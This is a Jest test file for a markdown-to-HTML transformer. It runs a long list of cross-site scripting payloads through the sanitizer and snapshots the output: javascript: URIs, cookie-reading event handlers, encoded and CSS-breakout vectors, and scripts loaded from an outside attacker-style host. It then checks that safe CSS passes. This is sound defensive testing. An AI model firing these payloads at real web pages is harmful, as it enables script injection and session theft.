/* eslint no-useless-escape: 0 */

import transform from '../src/transform';

const html = (text: string, options?: Parameters<typeof transform>[1]) => {
    const {
        result: {html},
    } = transform(text, {
        allowHTML: true,
        ...options,
    });
    return html;
};

// https://sking7.github.io/articles/218647712.html

const ckecks: Array<[string, string]> = [
    [
        'XSS Locator 1',
        `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">'><script>alert(String.fromCharCode(88,83,83))</script>`,
    ],
    ['XSS locator 2', `'';!--"<XSS>=&{()}`],
    ['No Filter Evasion', `<script src=http://ha.ckers.org/xss.js></script>`],
    ['Image XSS using the JavaScript directive', `<img src="javascript:alert('XSS');">`],
    ['No quotes and no semicolon', `<img src=javascript:alert('XSS')>`],
    ['Case insensitive XSS attack vector', `<img src=JaVaScRiPt:alert('XSS')>`],
    ['HTML entities', `<img src=javascript:alert("XSS")>`],
    ['Grave accent obfuscation', "<img src='javascript:alert(\"RSnake says, 'XSS'\")'>"],
    ['Malformed A tags', '<a onmouseover=alert(document.cookie)>xxs link</a>'],
    ['Malformed img tags', '<img """><script>alert("XSS")</script>">'],
    ['fromCharCode', '<img src=javascript:alert(String.fromCharCode(88,83,83))>'],
    [
        'Default src tag to get past filters that check src domain',
        `<img src=# onmouseover="alert('xxs')">`,
    ],
    ['Default src tag by leaving it empty', `<img src= onmouseover="alert('xxs')">`],
    ['Default src tag by leaving it out entirely', `<img onmouseover="alert('xxs')">`],
    [
        'Decimal HTML character references',
        `<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
    ],
    [
        'Decimal HTML character references without trailing semicolons',
        `<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
    ],
    [
        'Hexadecimal HTML character references without trailing semicolons',
        `<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
    ],
    ['Embedded tab', `<img src="jav	ascript:alert('XSS');">`],
    ['Embedded Encoded tab', `<img src="jav&#x09;ascript:alert('XSS');">`],
    ['Embedded newline to break up XSS', `<img src="jav&#x0A;ascript:alert('XSS');">`],
    ['Embedded carriage return to break up XSS', `<img src="jav&#x0D;ascript:alert('XSS');">`],
    [
        'Null breaks up JavaScript directive',
        `perl -e 'print "<img src=java\0script:alert(\"XSS\")>";' > out`,
    ],
    [
        'Spaces and meta chars before the JavaScript in images for XSS',
        `<img src=" &#14;  javascript:alert('XSS');">`,
    ],
    ['Non-alpha-non-digit XSS 1', `<script/xss src="http://ha.ckers.org/xss.js"></script>`],
    ['Non-alpha-non-digit XSS 2', '<body onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>'],
    ['Non-alpha-non-digit XSS 3', '<script/src="http://ha.ckers.org/xss.js"></script>'],
    ['Non-alpha-non-digit XSS 4', '<<script>alert("XSS");//<</script>'],
    ['No closing script tags', '<script src=http://ha.ckers.org/xss.js?< b >'],
    ['Protocol resolution in script tags', '<script src=//ha.ckers.org/.j>'],
    ['Half open HTML/JavaScript XSS vector', `<img src="javascript:alert('XSS')"`],
    ['Double open angle brackets', `<iframe src=http://ha.ckers.org/scriptlet.html <`],
    ['Escaping JavaScript escapes', `\";alert('XSS');//`],
    ['End title tag', `</title><script>alert("XSS");</script>`],
    ['input image', `<input type="image" src="javascript:alert('XSS');">`],
    ['body image', `<body background="javascript:alert('XSS')">`],
    ['img Dynsrc', `<img dynsrc="javascript:alert('XSS')">`],
    ['img lowsrc', `<img lowsrc="javascript:alert('XSS')">`],
    [
        'List-style-image',
        `<style>li {list-style-image: url("javascript:alert('XSS')");}</style><UL><LI>XSS</br>`,
    ],
    ['VBscript in an image', `<img src='vbscript:msgbox("XSS")'>`],
    ['Livescript', `<img src="livescript:[code]">`],
    ['body tag', `<body onload=alert('XSS')>`],
    ['BGSOUND', `<bgsound src="javascript:alert('XSS');">`],
    ['& JavaScript includes', `<br SIZE="&{alert('XSS')}">`],
    ['style sheet', `<link rel="stylesheet" href="javascript:alert('XSS');">`],
    ['Remote style sheet', `<link rel="stylesheet" href="http://ha.ckers.org/xss.css">`],
    ['Remote style sheet part 2', `<style>@import'http://ha.ckers.org/xss.css';</style>`],
    [
        'Remote style sheet part 3',
        `<meta http-equiv="Link" Content="<http://ha.ckers.org/xss.css>; rel=stylesheet">`,
    ],
    [
        'Remote style sheet part 4',
        `<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>`,
    ],
    [
        'style tags with broken up JavaScript for XSS',
        `<style>@im\port'\ja\vasc\ript:alert("XSS")';</style>`,
    ],
    [
        'style tags with broken up JavaScript for XSS part 2',
        `<img style="xss:expr/*XSS*/ession(alert('XSS'))">`,
    ],
    ['img style with expression', `exp/*<a style='no\\xss:noxss("*//*");`],
    ['img style with expression', `exp/*<a style='no\\xss:noxss("*//*");`],
    ['style tag', `<style type="text/javascript">alert('XSS');</style>`],
    [
        'style tag using background-image',
        `<style>.xss{background-image:url("javascript:alert('XSS')");}</style><a class=XSS></a>`,
    ],
    [
        'style tag using background',
        `<style type="text/css">body{background:url("javascript:alert('XSS')")}</style>`,
    ],
    [
        'svg with style tag and foreignObject inside',
        '<svg><style><foreignObject><img src="a" onerror=alert(1)/></foreignObject></style></svg>',
    ],
    ['Anonymous HTML with style attribute', `<xss style="xss:expression(alert('XSS'))">`],
    ['Local htc file', `<xss style="behavior: url(xss.htc);">`],
    ['US-ASCII encoding', `¼script¾alert(¢XSS¢)¼/script¾`],
    ['meta', `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">`],
    ['iframe', `<iframe src="javascript:alert('XSS');"></iframe>`],
    ['iframe Event based', `<iframe src=# onmouseover="alert(document.cookie)"></iframe>`],
    ['frame', `<frameset><frame src="javascript:alert('XSS');"></frameset>`],
    ['TABLE', `<table background="javascript:alert('XSS')">`],
    ['TD', `<table><td background="javascript:alert('XSS')">`],
    ['DIV background-image', `<div style="background-image: url(javascript:alert('XSS'))">`],
    [
        'DIV background-image with unicoded XSS exploit',
        `<div style="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`,
    ],
    [
        'DIV background-image with unicoded XSS exploit 2',
        `<div style="background-image: url(&#1;javascript:alert('XSS'))">`,
    ],
    ['DIV expression', `<div style="width: expression(alert('XSS'));">`],
    ['Downlevel-Hidden block', `<!--[if gte IE 4]>\n<script>alert('XSS');</script>\n<![endif]-->`],
    ['BASE tag', `<base href="javascript:alert('XSS');//">`],
    [
        'OBJECT tag',
        `<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>`,
    ],
    [
        'Using an EMBED tag you can embed a Flash movie that contains XSS',
        `<embed src="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></embed>`,
    ],
    [
        'You can EMBED SVG which can contain your XSS vector',
        `<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></embed>`,
    ],
    ['XML tag', `<xml></xml>`],
    [
        'Assuming you can only fit in a few characters and it filters against ".js"',
        `<script src="http://ha.ckers.org/xss.jpg"></script>`,
    ],
    [
        'SSI (Server Side Includes)',
        `<!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'IPT src=http://ha.ckers.org/xss.js></script>'"-->`,
    ],
    ['PHP', `<? echo('<SCR)';\necho('IPT>alert("XSS")</SCRIPT>'); ?>`],
    [
        'xlink:href',
        `<div id="test"><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(document.domain)"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" /></a></div>`,
    ],
    [
        'href animate from',
        `<div id="test"><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" href="javascript:alert(document.domain)"><circle r="400"></circle><animate attributeName="href" begin="0" from="javascript:alert(document.domain)" to="&" /></a></div>`,
    ],
    ['HTML tags in CSS values', '<style>.xss{font-family: "<script>alert(1)</script>"}</style>'],
    [
        'style tag closure attempts',
        '<style>.xss{font-family: "</style><script>alert(1)</script><style>"}</style>',
    ],
    [
        'complex XSS payload in font-family',
        '<style>.xss{font-family: "<//**/style/><h1><xss>XSSHere</xss><a id=yaSafeFrameAsyncCallbacks href=xss:alert(1)>1</a><script src=https://example.com/some.js></script></h1><style>"}</style>',
    ],
    [
        'HTML entities in CSS values',
        '<style>.xss{content: "&lt;script&gt;alert(1)&lt;/script&gt;"}</style>',
    ],
    ['Unicode escape sequences', '<style>.xss{content: "\\003Cscript\\003E"}</style>'],
    [
        'Style closure via font-family with complex payload',
        '<style>.xss{font-family: "<//**/style/><h1><xss>XSSHere</xss><script>alert(1)</script></h1><style>"}</style>',
    ],
    [
        'Style closure via background-image',
        '<style>.attack{background-image: url("</style><img src=x onerror=alert(1)><style>");}</style>',
    ],
    [
        'Style closure via content property',
        '<style>.evil{content: "</style><svg onload=alert(1)><style>";}</style>',
    ],
    [
        'Multi-line attack via color with comments',
        "<style>.hack{color: red;/* */ } </style><script>alert('XSS')</script><style> .fake {}</style>",
    ],
    [
        'Style closure via @import directive',
        '<style>@import "</style><iframe src=javascript:alert(1)></iframe><style>";</style>',
    ],
    [
        'Style closure via animation-name',
        '<style>.anim{animation-name: "</style><details open ontoggle=alert(1)><style>";}</style>',
    ],
    [
        'CSS variables attack',
        '<style>:root{--evil: "</style><marquee onstart=alert(1)>XSS</marquee><style>";}</style>',
    ],
    [
        'Style closure via filter property',
        '<style>.blur{filter: blur(5px) "</style><audio src=x onerror=alert(1)><style>";}</style>',
    ],
    [
        'Style closure via grid-template-areas',
        '<style>.grid{grid-template-areas: "</style><video src=x onerror=alert(1)><style>";}</style>',
    ],
    [
        'Combined attack with comments bypass',
        '<style>/* fake comment */ .test { color: "</style><!--\n--><script>alert(\'Bypassed!\')</script><!--\n--><style>"; }</style>',
    ],
    [
        'Unicode escape in font-family',
        '<style>.unicode{font-family: "\\22 \\3E \\3C /style\\3E \\3C script\\3E alert(1)\\3C /script\\3E";}</style>',
    ],
    [
        'Style closure via calc() function',
        '<style>.calc{width: calc(100% "</style><embed src=javascript:alert(1)><style>");}</style>',
    ],
    [
        'Case variations - uppercase STYLE',
        '<STYLE>.xss{font-family: "</STYLE><script>alert(1)</script><STYLE>"}</STYLE>',
    ],
    [
        'Case variations - mixed case',
        '<StYlE>.xss{font-family: "</StYlE><script>alert(1)</script><StYlE>"}</StYlE>',
    ],
    [
        'Style closure with space variations',
        '<style>.xss{font-family: "</ style><script>alert(1)</script><style>"}</style>',
    ],
    [
        'Multiple property attack',
        '<style>.multi{background: "</style><script>alert(1)</script><style>"; color: "</style><img src=x onerror=alert(2)><style>";}</style>',
    ],
    [
        'Nested style tags attack',
        '<style>.outer{content: "</style><style>.inner{}</style><script>alert(1)</script><style>";}</style>',
    ],
    [
        'CSS transform property attack',
        '<style>.transform{transform: rotate(0deg) "</style><object data=javascript:alert(1)></object><style>";}</style>',
    ],
    [
        'CSS transition property attack',
        '<style>.transition{transition: all 1s "</style><form><button formaction=javascript:alert(1)>XSS</button></form><style>";}</style>',
    ],
    [
        'CSS box-shadow attack',
        '<style>.shadow{box-shadow: 0 0 5px "</style><input onfocus=alert(1) autofocus><style>";}</style>',
    ],
    [
        'CSS border-image attack',
        '<style>.border{border-image: url("</style><textarea onfocus=alert(1) autofocus></textarea><style>");}</style>',
    ],
    [
        'CSS mask property attack',
        '<style>.mask{mask: url("</style><select onfocus=alert(1) autofocus><option>XSS</option></select><style>");}</style>',
    ],
    [
        'CSS clip-path attack',
        '<style>.clip{clip-path: url("</style><keygen onfocus=alert(1) autofocus><style>");}</style>',
    ],
    [
        'CSS counter attack',
        '<style>.counter{counter-reset: xss "</style><meter onfocus=alert(1) autofocus></meter><style>";}</style>',
    ],
    [
        'CSS quotes property attack',
        '<style>.quotes{quotes: "</style><progress onfocus=alert(1) autofocus></progress><style>";}</style>',
    ],
    [
        'CSS text-shadow attack',
        '<style>.text{text-shadow: 1px 1px "</style><output onfocus=alert(1) autofocus></output><style>";}</style>',
    ],
    [
        'CSS outline attack',
        '<style>.outline{outline: 1px solid "</style><datalist><option onfocus=alert(1) autofocus></option></datalist><style>";}</style>',
    ],
    [
        'CSS cursor attack',
        '<style>.cursor{cursor: url("</style><fieldset><legend onfocus=alert(1) autofocus>XSS</legend></fieldset><style>");}</style>',
    ],
    [
        'CSS list-style attack',
        '<style>.list{list-style: url("</style><label onfocus=alert(1) autofocus>XSS</label><style>");}</style>',
    ],
    [
        'CSS background-position attack',
        '<style>.bg{background-position: 0 0 "</style><abbr onfocus=alert(1) autofocus>XSS</abbr><style>";}</style>',
    ],
    [
        'CSS flex property attack',
        '<style>.flex{flex: 1 1 "</style><acronym onfocus=alert(1) autofocus>XSS</acronym><style>";}</style>',
    ],
    [
        'CSS grid-area attack',
        '<style>.area{grid-area: "</style><address onfocus=alert(1) autofocus>XSS</address><style>";}</style>',
    ],
    [
        'CSS perspective attack',
        '<style>.persp{perspective: 100px "</style><article onfocus=alert(1) autofocus>XSS</article><style>";}</style>',
    ],
    [
        'CSS backface-visibility attack',
        '<style>.back{backface-visibility: hidden "</style><aside onfocus=alert(1) autofocus>XSS</aside><style>";}</style>',
    ],
    [
        'CSS will-change attack',
        '<style>.will{will-change: transform "</style><bdi onfocus=alert(1) autofocus>XSS</bdi><style>";}</style>',
    ],
    [
        'CSS shape-outside attack',
        '<style>.shape{shape-outside: url("</style><bdo onfocus=alert(1) autofocus>XSS</bdo><style>");}</style>',
    ],
    [
        'CSS offset-path attack',
        '<style>.offset{offset-path: url("</style><cite onfocus=alert(1) autofocus>XSS</cite><style>");}</style>',
    ],
    [
        'CSS comments hiding escapes',
        '<div style="background:url(/* */\\6a\\61\\76\\61\\73\\63\\72\\69\\70\\74:alert(1))">test</div>',
    ],
    [
        'u/**/rl obfuscation',
        '<style>.test { background: u/**/rl(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        'ur/* */l obfuscation',
        '<style>.test { background: ur/* */l(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    ['&colon; entity', '<div style="background:url(javascript&colon;alert(1))">test</div>'],
    [
        '&NewLine; entity',
        '<style>.test { background: url(java&NewLine;script:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        '&Tab; entity',
        '<style>.test { background: url(java&Tab;script:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        'u\\72l escape',
        '<style>.test { background: u\\72 l(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        '\\75rl escape',
        '<style>.test { background: \\75 rl(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        'URL uppercase',
        '<style>.test { background: URL(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    [
        'uRl mixed case',
        '<style>.test { background: uRl(javascript:alert(1)); }</style><div class="test">test</div>',
    ],
    ['@charset', '<style>@charset "javascript:alert(1)";</style>'],
    ['@namespace', '<style>@namespace url("javascript:alert(1)");</style>'],
];

describe.each([
    ['enabled', true],
    ['disabled', false],
])('XSS checks with %s markdown-it-attrs', (_0, enableMarkdownAttrs) => {
    ckecks.forEach(([name, input]) => {
        it(name, () => {
            expect(html(input, {enableMarkdownAttrs})).toMatchSnapshot();
        });
    });
});

describe('CSS safe cases', () => {
    it('should allow safe CSS values', () => {
        expect(
            html('<style>.safe{color: red; font-size: 14px; margin: 10px;}</style>'),
        ).toMatchSnapshot();
    });

    it('should allow safe font-family values', () => {
        expect(html('<style>.safe{font-family: "Arial, sans-serif"}</style>')).toMatchSnapshot();
    });

    it('should allow common shorthands', () => {
        expect(
            html('<style>.safe{margin:0 auto; padding:10px 5px; border:1px solid #000}</style>'),
        ).toMatchSnapshot();
    });

    it('should allow safe functions like calc()', () => {
        expect(
            html('<style>.safe{width:calc(100% - 2rem); height:calc(50vh - 10px)}</style>'),
        ).toMatchSnapshot();
    });

    it('should allow gradients', () => {
        expect(
            html('<style>.safe{background:linear-gradient(45deg, #000, #fff)}</style>'),
        ).toMatchSnapshot();
    });

    it('should allow CSS variables with fallbacks', () => {
        expect(
            html(
                '<style>.safe{color:var(--brand-color, #222); background:var(--bg, transparent)}</style>',
            ),
        ).toMatchSnapshot();
    });

    it('should allow safe font-family lists', () => {
        expect(
            html("<style>.safe{font-family: Arial, 'Helvetica Neue', sans-serif}</style>"),
        ).toMatchSnapshot();
    });

    it('should allow list-style-type keywords', () => {
        expect(
            html('<style>ul.safe{list-style-type:disc} ol.safe{list-style-type:decimal}</style>'),
        ).toMatchSnapshot();
    });

    it('should allow child combinator in selectors', () => {
        expect(html('<style>.card > .title{font-weight:700}</style>')).toMatchSnapshot();
        expect(html('<style>ul > li > a{text-decoration:none}</style>')).toMatchSnapshot();
    });

    it('should allow font-family names with angle brackets when quoted', () => {
        expect(html('<style>.t{font-family:"ACME <Pro>"}</style>')).toMatchSnapshot();
    });

    it('should allow valid data URL for images', () => {
        expect(
            html(
                '<style>.icon{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)}</style>',
            ),
        ).toMatchSnapshot();
    });

    it('should block CSS escapes forming javascript: in URL', () => {
        // \0006a\000061... decodes to "javascript:"
        expect(
            html(
                '<style>.xss{background:url(\\0006a\\000061\\000076\\000061\\000073\\000063\\000072\\000069\\000070\\000074:alert(1))}</style>',
            ),
        ).toMatchSnapshot();
    });

    it('should block @import in property value', () => {
        expect(html('<style>.xss{font-family:"@import url(evil.css)"}</style>')).toMatchSnapshot();
    });

    it('should block BiDi in content with script tag', () => {
        // BiDi could hide malicious content
        expect(
            html('<style>.xss{content:"\u202E<script>alert(1)</script>\u202C"}</style>'),
        ).toMatchSnapshot();
    });
});
